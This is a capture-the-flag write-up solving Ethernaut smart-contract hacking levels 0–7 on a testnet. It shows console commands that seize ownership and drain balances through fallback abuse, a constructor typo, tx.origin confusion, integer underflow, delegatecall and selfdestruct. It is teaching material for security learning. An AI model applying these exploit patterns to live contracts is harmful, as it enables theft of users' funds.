# OpenZeppelin - Ethernaut

The [Ethernaut](https://ethernaut.openzeppelin.com/) is a Web3/Solidity-based wargame inspired by [overthewire.org](https://overthewire.org/), played in the Ethereum Virtual Machine. Each level is a smart contract that needs to be 'hacked'. Here are the writeups of my solutions for all the levels.

First, connect your wallet and make sure you are on a **testnet**.

## 0. Hello Ethernaut

It was more of an introductory level, helping you set up for the upcoming levels and giving bits of the basic but necessary information. [Create](https://sepolia.etherscan.io/tx/0x2acde9eb4f1a84eccdc86056da1dc9c3513b7d76c2b16f22b4b29e59f402e2b8) your [level instance](https://sepolia.etherscan.io/address/0x7430be47aac4dcf367fa4d9be04883d8be2441cb).

Then, look into `contract.info()` and complete the level:

```js
> await  contract.info()
'You will find what you need in info1().'
> await  contract.info1()
'Try info2(), but with "hello" as a parameter.'
await  contract.info2("hello")
'The property infoNum holds the number of the next info method to call.'
> await contract.infoNum()
words:
Array(2)
0:42
> await contract.info42()
'theMethodName is the name of the next method.'
> await contract.theMethodName()
'The method name is method7123949.'
> await contract.method7123949()
'If you know the password, submit it to authenticate().'
```

Okay, we don't know the password, but there is a method with that name:

```js
> await contract.password()
'ethernaut0'
```

Let's [authenticate](https://sepolia.etherscan.io/tx/0x584d4d7b2ec5ebf18a7072afb4728067d78bc742d20330905a81b19db50f2daf):

```js
> await contract.authenticate("ethernaut0")
```

Once the tx is confirmed, [submit](https://sepolia.etherscan.io/tx/0x6d788da493953ea7e23671b338dae1f0b96ad6a510ba16591575325b01bfc961) the level, and congrats you cleared your first ethernaut level!!

## 1. Fallback

First, [create](https://sepolia.etherscan.io/tx/0x1b3075a4642dec18d4f8d640766b5d8763330f60543a59a9bc9ba6616f5efeed) the [level instance](https://sepolia.etherscan.io/address/0x6d660aE836b7E481E9b3cFa8E01478eFBb743897):

> You will beat this level if you claim ownership of the contract and you reduce its balance to 0.
> Things that might help:
>
> - How to send ether when interacting with an ABI
> - How to send ether outside of the ABI
> - Converting to and from wei/ether units (see help() command)
> - Fallback methods

Let's check who is the **owner**:

```js
> await contract.owner()
'0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB'
```

[Call](https://sepolia.etherscan.io/tx/0x7b0ebf56fc14bc05113d9377994dafacba3005b5ef34e30ffb089f60bc779ee6) the `contribute()` method with the right amount of `ether` to pass the condition.

```js
await contract.contribute({ value: toWei("0.0001", "ether") });
```

The Smart Contract has a `payable fallback` receive funcion so we will just [send](https://sepolia.etherscan.io/tx/0xcf49a66ada6dc7a296927bd10ef428ead9e2aae94b4e99c4a5a3babb83ee3fab) a tx with some amount of `ether` and empty data to call it:

```js
> await sendTransaction({
  to: "0x6d660aE836b7E481E9b3cFa8E01478eFBb743897",
  value: toWei("0.0001", "ether"),
  from: "0xb8b74dc6bce6b16dcd634ab94600a3c9967e6f0d",
});
"0xcf49a66ada6dc7a296927bd10ef428ead9e2aae94b4e99c4a5a3babb83ee3fab"
```

Let's see who is the **owner** now:

```js
> await contract.owner();
"0xB8b74Dc6bce6B16dcd634aB94600a3c9967E6F0D"
```

I'm the **owner** now so I can [withdraw](https://sepolia.etherscan.io/tx/0x7fb9e0d63c4b14028f3d37b8d2779c1a2e9457d079e408fe4060519735064dd2) everything 😎:

```js
> await contract.withdraw()
{tx: '0x7fb9e0d63c4b14028f3d37b8d2779c1a2e9457d079e408fe4060519735064dd2'}
```

[Submit](https://sepolia.etherscan.io/tx/0x12f7e4ff905d3609f595709d4296be0e6e607a9ac046bee183bb331567892131) level instance to finish.

## 2. Fallout

First, [create](https://sepolia.etherscan.io/tx/0xf42e581a626fcdf22ae841976fb88a591fd819671eb3fa95b28dcf052749f90f) the [level instance](https://sepolia.etherscan.io/address/0xaF2C39b2AD3E3b8a33B6eCD7D4A583DF064c4e50):

> Claim ownership of the contract below to complete this level.
> Things that might help:
>
> - Solidity Remix IDE

Check who is the current **owner**:

```js
> await contract.owner()
'0x0000000000000000000000000000000000000000'
```

This was an easy level because we can use the function marked as a **constructor** for the Smart Contract has a typo. It is `Fal1out()` instead of `Fallout()`.

Let's simply [call](https://sepolia.etherscan.io/tx/0x27583e3d65e79684f1762306c9886b3cd2982073bf5ba8795b69df389b98bdb9) this function and send `10 wei` to become the **owner**:

```js
> await contract.Fal1out({value:"10"})

{tx: '0x27583e3d65e79684f1762306c9886b3cd2982073bf5ba8795b69df389b98bdb9'}
```

Then, we can see we are the **owner**...

```js
> await contract.owner()
'0xB8b74Dc6bce6B16dcd634aB94600a3c9967E6F0D'
```

[Submit](https://sepolia.etherscan.io/tx/0x942fb6c2348a5a78b41271fc4f1bd05e8b7b621700be40c94ed14c6c6caa46aa) level instance to finish.

## 3. Coin Flip

First, [create](https://sepolia.etherscan.io/tx/0x8d11cd80e3d5da41c68bc7980f67552149d25cce53b394fc1efd864b0a4f34ea) the [level instance](https://sepolia.etherscan.io/address/0x773318bacf964d3999687d33eacbbb740152c3c8):

> This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

The `flip()` _function_ is using the **current block number** to decide the side of the coin, so the random-seeming function is not really random.

We can access the block number in a separate smart contract and predict the output of the `flip()`. The only thing we need to take care of is the first _function_ that checks if the `blockValue` is the same as the previously stored hash, indicating a **replay attack**.

```js
if (lastHash == blockValue) {
  revert();
}
```

So we cannot use a `for loop` and call the `flip()` 10 times in a **single transaction** since that transaction will be written in a single block and in the second iteration of the loop the **lastHash** will become equal to the `blockValue` resulting in a revert.

Let's [deploy](https://sepolia.etherscan.io/tx/0x760f8f157fb1149dda2535d48c7378e98c2b6d3e6e9cfcea66fd766feec9b7ce) the [CoinFlipAttack.sol](https://sepolia.etherscan.io/address/0xe41b7732da112da4316cd46fa02d2e1cdadb70ee) contract using the `CoinFlip` **address**. Then execute the `IncreaseItBy1` function 10 times manually.

[Submit](https://sepolia.etherscan.io/tx/0xbf59e2e5635ace5352f38c7aea27490945c47a89d48a7c827002f533a8498f4c) level instance to finish.

## 4. Telephone

First, [create](https://sepolia.etherscan.io/tx/0x46005f807d17164bab005d2b454c5da4abb5117323b70fbe217205a2f783b05e) the [level instance](https://sepolia.etherscan.io/address/0x06ec685d245564f48e78f588a1e9eec043c55ce0):

> Claim ownership of the contract below to complete this level.

Let's see who is the **current owner**:

```js
> await contract.owner()
'0x2C2307bb8824a0AbBf2CC7D76d8e63374D2f8446'
```

The conditional in the `changeOwner()` can be passed only if the **origin** of the transaction is not the same as the **last message sender**.

The `tx.origin` global variable refers to the **original external account** that started the transaction while `msg.sender` refers to the immediate account (it could be external or another contract account) **that invokes the function**.

We simply need to [deploy](https://sepolia.etherscan.io/tx/0xcdf553eb8a9b78aea0692315e52c3f616298719e3b4ffd971c5d64f1cc7e57fb) an intermediate [contract](https://sepolia.etherscan.io/address/0x7314d9756c11fb57563765dddce504ce517789c3) and [invoke](https://sepolia.etherscan.io/tx/0x8a316bffcb349d36d786e98d2c900be4bd5063b764451ec7e4084e1da384f9f1) the `changeOwner()` from it.

And now we are the **owner**:

```js
> await contract.owner()
'0xB8b74Dc6bce6B16dcd634aB94600a3c9967E6F0D'
```

[Submit](https://sepolia.etherscan.io/tx/0x8ef00b350da3dfd038b951bdbbef343257d3512e693616ec9ee78564dbd33b5c) level instance to finish.

## 5. Token

First, [create](https://sepolia.etherscan.io/tx/0x0057b7a2bafc16e37bbb1162acc59b79b3cb303b5d395f7b83b1573384fc86e4) the [level instance](https://sepolia.etherscan.io/address/0x2fc1500ccd9f2d3baad615cdcb99b37d3f1c3460):

> The goal of this level is for you to hack the basic token contract below. You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

In this contract we can see a simple **uint overflow problem** since there are no `SafeMath` checks. If we [pass](https://sepolia.etherscan.io/tx/0x376ba5d5f15eb96049020172b927b18620f313f5538031f51f3b83394819af98) any number larger than 20 to the **value** of the `transfer` it will result in the operation `20 - 21` which is equal to `UintMax`.

```js
> await contract.transfer("0x871D838738B2B745EAA37216Fc0360C94a319a20", 21)
```

Then, check the balance:

```js
> x = await contract.balanceOf(player);

> x.toString();

("115792089237316195423570985008687907853269984665640564039457584007913129639935");
```

[Submit](https://sepolia.etherscan.io/tx/0x1a97b40f18cd85b8acee1c3aed1c07684056357a1f806b6e254d64b5cb0ebceb) level instance to finish.

## 6. Delegation

First, [create](https://sepolia.etherscan.io/tx/0x64d7cd6f97979ae82e412c74587d223a9588b5d93e7acfec631ace067509a570) the [level instance](https://sepolia.etherscan.io/address/0xb19D92d3F73b0bbB570417f8971e9f129a4fb14F):

> The goal of this level is for you to claim ownership of the instance you are given.
> Things that might help:
>
> - Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
> - Fallback methods
> - Method ids

In this level, it's important how `DELEGATECALL` [works](https://solidity-by-example.org/delegatecall/). Once we understand, we need to know the **Method ID** of the function `pwn()`:

```js
> web3.eth.abi.encodeFunctionSignature("pwn()");
'0xdd365b8b'
```

And now, let's create a new [transaction](https://sepolia.etherscan.io/tx/0x76b2416f77b1afd401e4a007e6cb91f5b396b4c252a28f878f834d103f522bb1) that goes to the `fallback` using the `CALLDATA` of `pwn()` to become the **owner**:

```js
> await web3.eth.sendTransaction({from:player, data:"0xdd365b8b", to:instance})
```

Check the owner then:

```js
> await contract.owner()
'0xB8b74Dc6bce6B16dcd634aB94600a3c9967E6F0D'
```

We're the owner! [Submit](https://sepolia.etherscan.io/tx/0x83096032db4598b3df1e941ca72e355be3e5f4ae5c4cb7a31f66db80f36cfff8) level instance to finish.

## 7. Force

First, [create](https://sepolia.etherscan.io/tx/0x5071671a06eb0e1f419db930a77799c67d3db1635b3a22651ac7d15aba425fce) the [level instance](https://sepolia.etherscan.io/address/0x9bc434083fc6290954de65dfe7ef0966516dcbbe):

> Some contracts will simply not take your money ¯\_(ツ)\_/¯
> The goal of this level is to make the balance of the contract greater than zero.
> Things that might help:
>
> - Fallback methods
> - Sometimes the best way to attack a contract is with another contract.

To solve this challenge, we need to learn all the possible way for which a contract can receive **ETH**:

- The contract implements at least a payable function and we send some ether along with the function call.

- The contract implements a receive function.

- The contract implements a payable fallback function.

- The last and more "strange" way that can and has created various security problem is via `selfdestruct()`

- Bonus point: a contract without a receive Ether function can also receive Ether as a recipient of a coinbase transaction (miner block reward)

But in this case we can't use any function of the contract because there is none. So let's [create](https://sepolia.etherscan.io/tx/0xc394964d3868ca1e5e9e819fcdd2ac28f05d72bb67071365f6b02a074475242d) another [contract](https://sepolia.etherscan.io/address/0xbef7d187ae8bab4b0c381f6fc4fe83a20636afac) which we can destroy.

Then, [deposit](https://sepolia.etherscan.io/tx/0x28a46c2ea8031fb6c22a671bb40d01c3323431e326e91598f44043b820804bd0) some funds to our contract. Finally, [destroy](https://sepolia.etherscan.io/tx/0xe85463dd371a21ec90e029c1153251d4819fcc1017d28a5652594337cfd22d91) our contract so the funds go to **Force**.

There is no way to stop an attacker from sending ether to a contract by self destroying. , [submit](https://sepolia.etherscan.io/tx/0x07d8e31cf986362d329081444b2ab5e251e17ab207454061b35c4b1675a799a4) level instance to finish.
